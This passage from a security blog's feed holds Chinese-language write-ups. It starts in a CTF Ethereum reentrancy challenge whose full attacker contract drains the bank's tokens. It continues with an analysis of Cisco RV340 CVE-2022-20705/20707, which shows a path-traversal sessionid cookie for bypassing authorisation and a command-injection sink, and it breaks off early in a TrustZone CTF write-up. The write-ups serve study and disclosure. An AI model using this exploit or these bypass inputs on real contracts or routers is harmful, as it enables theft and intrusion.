allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token &#x3D; new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        &#x2F;&#x2F; the token contract&#39;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] &#x3D; 500000 * 10**18;  &#x2F;&#x2F; half for me</span><br><span class="line">        balanceOf[player] &#x3D; 500000 * 10**18;      &#x2F;&#x2F; half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;&#x3D; balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] +&#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=WDbOK_fDu9Y">A British Bank</a>.</p><p><strong>解题：</strong></p><p>题目要求我们将 Bank 的余额清零。</p><p><code>TokenBankChallenge.withdraw(uint256)</code> 中存在重入漏洞：</p><p>它先发出消息调用 <code>token.transfer(msg.sender)</code> 后修改状态</p><p>前者又会发起外部调用 <code>ITokenReceiver(to).tokenFallback()</code>，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isContract(to)) &#123;</span><br><span class="line">    ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断了to地址是否是个合约地址，如果是合约的话就用<code>ITokenReceiver</code>接口来调用<code>to</code>合约的<code>tokenFallback</code>函数，在银行合约里这个函数用更改目标的balance，但是<code>to</code>是我们可控的 ， 我们只需部署攻击合约，且该合约也存在 <code>tokenFallback</code> 函数，然后函数中再调用 <code>TokenBankChallenge.withdraw</code> , 就可以合约身份执行<code>withdraw</code>函数</p><p>步骤：</p><ol><li>部署攻击合约</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenBankChallenge &#123;</span><br><span class="line">    function token() external returns (address);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line">interface ISimpleERC223Token &#123;</span><br><span class="line">    function totalSupply() external returns (uint256);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool success); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankSolver &#123;</span><br><span class="line">    ITokenBankChallenge public challenge;</span><br><span class="line">    ISimpleERC223Token public token;</span><br><span class="line">    uint256 public balance &#x3D; 500000000000000000000000;</span><br><span class="line"></span><br><span class="line">    function TokenBankSolver(address _addr) public &#123;</span><br><span class="line">        challenge &#x3D; ITokenBankChallenge(_addr);</span><br><span class="line">        token &#x3D; ISimpleERC223Token(challenge.token());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns(uint256) &#123;</span><br><span class="line">            token.transfer(challenge, balance);</span><br><span class="line">            challenge.withdraw(balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">            token.balanceOf(from); </span><br><span class="line">            require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">            uint256 challengeLeftBalance &#x3D; token.balanceOf(address(challenge));</span><br><span class="line">            bool keepRecursing &#x3D; challengeLeftBalance &gt; 0;</span><br><span class="line">            if (keepRecursing) &#123;</span><br><span class="line">                uint256 v &#x3D; value &lt; challengeLeftBalance? value: challengeLeftBalance;</span><br><span class="line">                challenge.withdraw(v);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns(bool) &#123;</span><br><span class="line">        return challenge.isComplete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>将 Bank中的 balance 全部提换成 Token -&gt; TokenBankChallenge.withdraw =&gt;SimpleERC223Token</p></li><li><p>设置 allowance :<code> allowance[from=player][msg.sender=player] =500000000000000000000000</code></p></li><li><p>将 player 的 Token 全部转到攻击合约上：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simpleERC223Token_contract.functions.transferFrom(player_account.address,to&#x3D;attack_contract_address,value&#x3D;500000000000000000000000)</span><br></pre></td></tr></table></figure><ol start="5"><li>调用攻击合约的 attack 函数</li></ol><p>这样就完成了攻击步骤</p><p>至此就全部做完了：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="Ethereum" scheme="https://bestwing.me/tags/Ethereum/"/>
    
    <category term="contracts" scheme="https://bestwing.me/tags/contracts/"/>
    
  </entry>
  
  <entry>
    <title>Pwning a Cisco RV340  漏洞分析（CVE-2022-20705 和 CVE-2022-20707</title>
    <link href="https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html"/>
    <id>https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html</id>
    <published>2022-04-01T16:00:00.000Z</published>
    <updated>2022-04-03T11:30:35.815Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>原作者用到了四个漏洞， 我这里简单分析其中两个，分别是  CVE-2022-20705 和 CVE-2022-20707</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>影响版本： RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img</p><p><a href="https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html">Relyze Software Limited - Advanced Software Analysis: Pwning a Cisco RV340 with a 4 bug chain exploit</a></p><h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><p><a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.26?catid=268437899">Software Download - Cisco Systems</a></p><h2 id="CVE-2022-20705-Improper-Session-Management-Vulnerability"><a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability" class="headerlink" title="CVE-2022-20705 Improper Session Management Vulnerability"></a>CVE-2022-20705 Improper Session Management Vulnerability</h2><p>Nginx 配置不当加上 upload.cgi 对 cookie 两者处理不一致导致的授权绕过。</p><p>首先 nginx 对 upload 模块的 session 的处理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ cat web.upload.conf</span><br><span class="line">location &#x2F;form-file-upload &#123;</span><br><span class="line">include uwsgi_params;</span><br><span class="line">proxy_buffering off;</span><br><span class="line">uwsgi_modifier1 9;</span><br><span class="line">uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">uwsgi_read_timeout 3600;</span><br><span class="line">uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;upload &#123;</span><br><span class="line">set $deny 1;</span><br><span class="line"></span><br><span class="line">        if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">                set $deny &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($deny &#x3D; &quot;1&quot;) &#123;</span><br><span class="line">                return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">upload_pass &#x2F;form-file-upload;</span><br><span class="line">upload_store &#x2F;tmp&#x2F;upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name.name &quot;$upload_file_name&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.content_type &quot;$upload_content_type&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.md5&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.size&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">upload_cleanup 400 404 499 500-505;</span><br><span class="line">upload_resumable on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现， 这里是判断如果 <code>/tmp/websession/token/$cookie_sessionid</code> 文件存在,则返回。  注意这里的 <code>$cookie_sessionid</code> 是由用户在 HTTP 请求中传入的。可以看到这里的文件没有判断是否存在 <code>../../</code>  。因此如果我们跨目录指向一个存在的文件就可能造成授权绕过。像这里作者使用的是  <code>../../../etc/firmware_version</code>。 </p><p>虽然在 <code>upload.cgi</code> 对 HTTP_COOKIE 进行了正则校验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v16 = strcmp_1(REQUEST_URI, <span class="string">&quot;/api/operations/ciscosb-file:form-file-upload&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (v16 != <span class="number">0</span>) &#123;</span><br><span class="line">    v17 = strcmp_1(REQUEST_URI, <span class="string">&quot;/upload&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (v17 == <span class="number">0</span> &amp;&amp; HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if the URI is /upload and we have a sessionid in the cookie</span></span><br><span class="line">        v18 = strlen_1(HTTP_COOKIE);</span><br><span class="line">        <span class="keyword">if</span> (v18 &lt; <span class="number">81</span>) &#123; <span class="comment">// sanity check sessionid characters</span></span><br><span class="line">            v19 = match_regex(<span class="string">&quot;^[A-Za-z0-9+=/]*$&quot;</span>, HTTP_COOKIE);</span><br><span class="line">            <span class="keyword">if</span> (v19 == <span class="number">0</span>) &#123;</span><br><span class="line">                v20 = StrBufToStr(local_0x44);</span><br><span class="line">                func_0x2684(HTTP_COOKIE, content_destination, content_option, content_pathparam, v20, content_cert_name, content_cert_type, content_password);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在程序没有考虑用户在  HTTP cookie 中传入多个 session_id 的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if an cookie is available</span></span><br><span class="line">    StrBufSetStr(cookie_str, HTTP_COOKIE);</span><br><span class="line">    __s2 = StrBufToStr(cookie_str);</span><br><span class="line">    next_semicolon = strtok_r(__s2, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// start to split the semicolon deliminated cookie</span></span><br><span class="line">    HTTP_COOKIE = <span class="number">0</span>; <span class="comment">// this variable will become the sessionid string</span></span><br><span class="line">    <span class="keyword">while</span> (next_semicolon != <span class="number">0</span>) &#123;</span><br><span class="line">        sessionid = <span class="built_in">strstr</span>(next_semicolon, <span class="string">&quot;sessionid=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sessionid != <span class="number">0</span>) &#123; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">            HTTP_COOKIE = sessionid + <span class="number">10</span>; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        next_semicolon = strtok_r(<span class="number">0</span>, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// keep searching</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么如果设置两个 seesionid ， 第一个为 <code>../../../etc/frimware_version</code> ， 第二个为可以通过正则的有效字符。</p><p>最后我们就可以用授权的状态访问 <code>upload.cgi</code> 了。</p><h2 id="CVE-2022-20707-Command-Injection"><a href="#CVE-2022-20707-Command-Injection" class="headerlink" title="CVE-2022-20707 Command Injection"></a>CVE-2022-20707 Command Injection</h2><p>作者在 <code>upload.cgi</code> 里找到了一个命令注入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (json_obj != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">json_str = json_object_to_json_string(json_obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;buff, <span class="string">&quot;curl %s --cookie &#x27;sessionid=%s&#x27; -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;%s&#x27;&quot;</span>, v3, sessionid, json_str);</span><br><span class="line"></span><br><span class="line">debug(<span class="string">&quot;curl_cmd=%s&quot;</span>, &amp;buff);</span><br><span class="line"></span><br><span class="line">__stream = popen(&amp;buff, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__stream != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">fread_1(&amp;buff[<span class="number">2048</span>], <span class="number">2048</span>, <span class="number">1</span>, __stream);</span><br><span class="line"></span><br><span class="line">fclose_1(__stream);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的的 json_str 没有校验， 会造成命令注入。</p><h2 id="Related-vulnerability-tracking"><a href="#Related-vulnerability-tracking" class="headerlink" title="Related vulnerability tracking"></a>Related vulnerability tracking</h2><p>我们之前分析了 CVE-2022-20699-cisco-RV34X 的时候，注意到一个补丁， 修补了 Nginx 的配置不当的漏洞。然后今天和 @leommxj 一起追溯了一下 cisco 的修补历史。</p><h3 id="Firmware-version-1-0-03-19"><a href="#Firmware-version-1-0-03-19" class="headerlink" title="Firmware version 1.0.03.19"></a>Firmware version 1.0.03.19</h3><p>nginx 对调用 upload.cgi 没有任何的校验， 因此可以访问 upload.cgi ， 还出两个漏洞 #CVE-2020-3451 #CVE-2020-3453</p><p>相关的漏洞信息为:</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1100/">ZDI-20-1100 | Zero Day Initiative</a><br><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1101/">ZDI-20-1101 | Zero Day Initiative</a><br><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-osinj-rce-pwTkPCJv">Cisco Small Business RV340 Series Routers Command Injection and Remote Code Execution Vulnerabilities</a></p><h3 id="Firmware-version-1-0-03-21"><a href="#Firmware-version-1-0-03-21" class="headerlink" title="Firmware version 1.0.03.21"></a>Firmware version 1.0.03.21</h3><p>之后有个老哥发现 cisco 虽然加行了授权校验，但是加得不行。</p><p>这加之前和加之后的 diff：<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png"></a></p><p>这个修复有一个致命的缺陷。逻辑是这样的，任何非空的授权标头都会将 $deny 设置为“0”。因此，从字面上发送任何看起来有效的授权标头作为请求/上传的一部分将绕过授权检查。</p><p>相关漏洞信息为： </p><p>#CVE-2021-1473 #CVE-2021-1472<br><a href="https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/">Advisory: Cisco RV34X Series - Authentication Bypass and Remote Command Execution - IoT Inspector (iot-inspector.com)</a></p><h3 id="Firmware-version-1-0-03-22"><a href="#Firmware-version-1-0-03-22" class="headerlink" title="Firmware version 1.0.03.22"></a>Firmware version 1.0.03.22</h3><p>然后这个版本之后去掉了上图 13 行的 nginx 配置。但是出现了此次 <a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> 这个漏洞了。</p><h3 id="Firmware-version-1-0-0-3-26"><a href="#Firmware-version-1-0-0-3-26" class="headerlink" title="Firmware version 1.0.0.3.26"></a>Firmware version 1.0.0.3.26</h3><p>最新版本的 nginx 现在配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;upload &#123;</span><br><span class="line">    set $deny 0;</span><br><span class="line"></span><br><span class="line">    if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($cookie_sessionid ~* &quot;^[a-f0-9]&#123;64&#125;&quot;) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($deny !&#x3D; &quot;012&quot;) &#123;</span><br><span class="line">            return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>增加了一个正则判断。</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>一个点有意思的是， 这<a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> 作者 和 <a href="#Firmware-version-1-0-03-21">CVE-2021-1473</a> 作者用到的命令注入和我当时挖到<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv340-cmdinj-rcedos-pY8J3qfy">两个编号</a> #CVE-2021-1609 和 #CVE-2021-1610  的漏洞点在一行代码里，这意思就是这行代码一共出了 4 个漏洞编号</p><p>以后挖 IoT 漏洞也要多注意一下 web 相关的配置了。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2022-20705" scheme="https://bestwing.me/tags/CVE-2022-20705/"/>
    
    <category term="CVE-2022-20707" scheme="https://bestwing.me/tags/CVE-2022-20707/"/>
    
    <category term="cisco" scheme="https://bestwing.me/tags/cisco/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF-4th TrustZone challenge Writeup</title>
    <link href="https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html"/>
    <id>https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html</id>
    <published>2022-01-23T16:00:00.000Z</published>
    <updated>2022-01-25T05:25:15.845Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>第四届 realworldctf 我和 @chennan 出了三个题目，分别是  <code>Trust or Not</code>, <code>UnTrustZone</code> and <code>Wheels on the Bus</code>， 其中   <code>Trust or Not</code>, <code>UnTrustZone</code>  是和 TrustZone 相关的题目。</p><h2 id="TrustZone-challenge"><a href="#TrustZone-challenge" class="headerlink" title="TrustZone challenge"></a>TrustZone challenge</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" title="image-20220113181523560" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" alt="image-20220113181523560"></a></p><p>TrustZone是基于硬件的安全功能，它通过对原有硬件架构进行修改，在处理器层次引入了两个不同权限的保护域——安全世界和普通世界，任何时刻处理器仅在其中的一个环境内运行。同时这两个世界完全是硬件隔离的，并具有不同的权限，正常世界中运行的应用程序或操作系统访问安全世界的资源受到严格的限制，反过来安全世界中运行的程序可以正常访问正常世界中的资源。这种两个世界之间的硬件隔离和不同权限等属性为保护应用程序的代码和数据提供了有效的机制：通常正常世界用于运行商品操作系统（例如Android、iOS等），该操作系统提供了正常执行环境（Rich Execution Environment，REE）；安全世界则始终使用安全的小内核（TEE-kernel）提供可信执行环境（Trusted Execution Environment，TEE），机密数据可以在TEE中被存储和访问。</p><h3 id="Trust-or-Not"><a href="#Trust-or-Not" class="headerlink" title="Trust or Not"></a>Trust or Not</h3><p>题目描述：</p><blockquote><p>Trust or Not</p><p>Score: <em>357</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Reverse&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>We have lost some of our files and cannot retrieve the plaintext data originally stored.</p><p>Hint: flag file is stored in <code>/data/tee/2</code> securely.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc 47.242.114.24 7788</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/Trust_or_not_fa542592446c43678f685913495da668.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>要解决这个题目，首先要了解什么是安全存储。 数据要么以某种加密/授权的方式存储在linux文件系统<code>/data/tee</code>中，要么存储在Emmc RPMB（Replay Protected Memory Block）分区中。这次的相关题目主要使用了 <code>OP-TEE</code>的开源项目，其更详细的信息可以在<a href="https://github.com/ForgeRock/optee-os/blob/master/documentation/secure_storage.md">OP-TEE文档</a> 中找到。</p><p> **Hardware Unique Key （HUK） ** </p><p>大多数设备都有某种硬件唯一密钥（HUK），主要用于派生其他密钥。例如，当派生密钥用于安全存储等时，可以使用 HUK 派生。HUK 的重要之处在于它需要得到很好的保护，并且在最好的情况下，HUK 永远不应该直接从软件读取，甚至不应该从安全方面读取。有不同的解决方案，加密加速器可能支持它，或者，它可能涉及另一个安全的协处理器。</p><p> <strong>Secure Storage Key （SSK）</strong> </p><p>SSK是每个设备的密钥，在OP-TEE启动时生成并存储在安全内存中。SSK用于派生TA存储密钥（TSK）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSK &#x3D; HMACSHA256 (HUK, Chip ID || “static string”)</span><br></pre></td></tr></table></figure><p>获取硬件唯一密钥（HUK）和芯片ID的功能取决于平台实现。目前，OP-TEE 系统中每台设备只有一把 SSK，用于安全存储子系统。但是，为了将来，我们可能需要为每台设备使用生成 SSK 的相同算法为不同的子系统创建不同的密钥。为不同子系统生成不同的密钥的简单方法是使用不同的静态生成密钥的字符串。</p><p> <strong>Trusted Application Storage Key （TSK）</strong>  </p><p>TA存储密钥</p><p>TSK是每个受信任的应用程序密钥，由SSK和TA的标识符（UUID）生成。它被用来保护FEK，换句话说，用来加密/解密FEK。</p><p>代码实现：<code>build/optee_os/core/tee/tee_fs_key_manager.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uuid) &#123;</span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, uuid, <span class="keyword">sizeof</span>(*uuid));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pick something of a different size than TEE_UUID to</span></span><br><span class="line"><span class="comment"> * guarantee that there&#x27;s never a conflict.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint8_t</span> dummy[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">   